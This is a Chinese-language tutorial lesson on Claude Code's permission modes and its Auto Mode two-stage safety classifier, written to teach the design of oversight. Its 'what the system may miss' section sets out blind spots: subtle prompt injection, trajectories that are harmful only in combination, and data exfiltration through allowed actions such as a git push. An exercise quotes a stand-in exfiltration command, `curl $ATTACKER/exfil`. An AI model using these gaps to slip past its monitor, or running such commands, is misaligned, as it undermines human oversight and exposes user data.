# Claude Code 作为自主代理：权限模式与自动模式

> Claude Code 暴露了七种权限模式。"plan"在每个动作前询问，"default"仅对风险动作询问，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准一切。自动模式（Auto Mode，2026 年 3 月 24 日）将逐动作审批替换为一个两阶段并行安全分类器：一个单 token 快速检查运行在每个动作上；被标记的动作触发链式思维深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。自动模式作为研究预览发布 —— Anthropic 已明确声明该分类器本身并不足够。

**类型：** 学习
**语言：** Python（stdlib，两阶段分类器模拟器）
**前置要求：** 第 15 阶段 · 01（长周期代理），第 15 阶段 · 09（编码代理全景）
**时间：** ~45 分钟

## 问题

一个在你机器上运行的自主编码代理是一个独特的安全类别。攻击面是代理能触及的一切 —— 文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用代理不是聊天机器人的"功能更新"，而是一种具有新型风险画像的新型工具。

Claude Code 的权限系统是 Anthropic 的答案。不是用一个"自主/非自主"开关，而是有七种模式跨越一个能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式在速度和逐动作审查之间做出不同的权衡。自动模式（2026 年 3 月）增加了一个两阶段分类器，将审批从用户的关键路径上移开 —— 对于分类器判断为安全的动作 —— 同时为分类器标记的动作保留审查层。

工程问题是：这个系统能捕获什么、遗漏什么，以及给定任务实际需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | 代理提出计划；用户批准整个计划；每个动作在执行前都经过审查 | 不熟悉的任务；生产环境附近的代码；首次在仓库上使用代理 |
| `default` | 代理运行动作；对任何"风险"动作提示用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多个文件的重构 |
| `acceptExec` | 在精选允许列表内的 shell 命令自动批准；写入自动批准 | 紧密内循环，每个 shell 命令都是 `npm test` 或类似操作 |
| `autoMode` | 两阶段安全分类器；被标记的动作升级到审查 | 在受限工作空间中的长周期无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许列表/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档说明为"仅在你愿意丢弃的临时容器内" |

（以上名称与公开的 Claude Code 文档一致；"yolo"是宽松中间地带的非正式简称。）

### 自动模式一页概览

自动模式（2026 年 3 月 24 日发布）是第一个将逐动作审批委托给模型的权限模式。结构：

1. **第一阶段 —— 单 token 分类器。** 运行在每个提议的动作上。廉价。返回"安全"或"标记"。设计为与主代理循环并行运行，以便已批准的动作不会在队列中等待。
2. **第二阶段 —— 二级策略/安全审查。** 仅在标记的动作上运行。对动作、会话当前状态和声明的任务进行有针对性的策略和安全评估。如果置信度低，则升级到用户人工介入（HITL）。

预算控制与分类器并行：

- `max_turns` —— 会话中的总迭代次数。
- `max_budget_usd` —— 中止会话的美元上限。
- 每个工具的动作次数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统能捕获什么

- 直接的提示注入（prompt injection），注入的指令映射到已知风险的动作形状。
- 重复的工具循环 —— 分类器可以看到动作 N+1 与动作 N 几乎相同，连续五次。
- 在原本仅文件编辑的会话中明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示注入**，在不产生单个标记动作的情况下调节行为。间接提示注入不是一个可以完全修补的漏洞（OpenAI 安全负责人，2025 年，关于浏览器代理 —— 见第 11 课）。
- **语义层面的不当行为。** 每个单独的动作看起来安全，而组合起来的轨迹是有害的。分类器判断动作；它不会重新推导用户的意图。
- **通过合法渠道的数据外泄。** 将数据写入你拥有的文件，然后 `git push` 到公共仓库，是一系列允许的动作，其组合才是问题。

### 研究预览框架

Anthropic 将自动模式作为研究预览发布。文档明确指出分类器是一个层次，而非解决方案：用户应结合预算、允许列表、隔离工作空间和轨迹审计（第 12-16 课）来使用自动模式。预览框架也反映了已记录的评估-部署差距（第 1 课）—— 一个在离线评估中通过的分类器，在用户上下文模糊的真实会话中可能表现不同。

### 这个阶梯在你工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚一次糟糕的运行更便宜。
- 已知的重构：`acceptEdits` 节省大量确认点击。
- 无人值守的后台运行：`autoMode` 仅在你已测量过爆炸半径的工作空间内使用（无凭证、无生产挂载、无未主动选择的出口）。
- 临时容器：`yolo` / `bypassPermissions` 仅在容器及其凭证可丢弃时才是可接受的。

## 使用它

`code/main.py` 模拟两阶段分类器。第一阶段是对提议动作的廉价关键词规则；第二阶段是较慢的多规则审查器。驱动程序输入一个短的合成轨迹（安全动作、一次提示注入尝试、一个重复循环），并展示分类器在哪里捕获、在哪里遗漏。

## 交付它

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需的隔离级别。

## 练习

1. 运行 `code/main.py`。哪个合成动作类型从未被第一阶段标记，但总是被第二阶段捕获？哪个两者都未捕获？

2. 扩展第一阶段的规则集以捕获一个特定的已知危险形状（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量误报率。

3. 阅读 Anthropic 的"How the agent loop works"文档。列出代理在 `default` 模式下默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，哪些需要单独设门控？

4. 设计一个 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每个工具的上限、允许列表。证明每个数字的合理性。

5. 描述一个轨迹，其中每个单独的动作都被第一阶段和第二阶段批准，但组合行为却是失调的。（第 14 课涵盖终止开关和蜜罐令牌如何解决这个问题。）

## 关键术语

| 术语 | 人们说的 | 实际含义 |
|---|---|---|
| 权限模式 (Permission mode) | "代理能做什么" | 七种命名策略之一，控制逐动作审批 |
| plan 模式 | "先问再做" | 代理编写计划；用户批准后执行 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "自动审批" | 两阶段安全分类器；标记的动作升级 |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| 第一阶段分类器 (Stage 1 classifier) | "快速 token 检查" | 对提议动作的单 token 规则；并行运行 |
| 第二阶段分类器 (Stage 2 classifier) | "深度审查" | 对标记动作的链式思维推理 |
| 研究预览 (Research preview) | "非 GA" | Anthropic 对失败模式仍在映射中的功能的框架 |
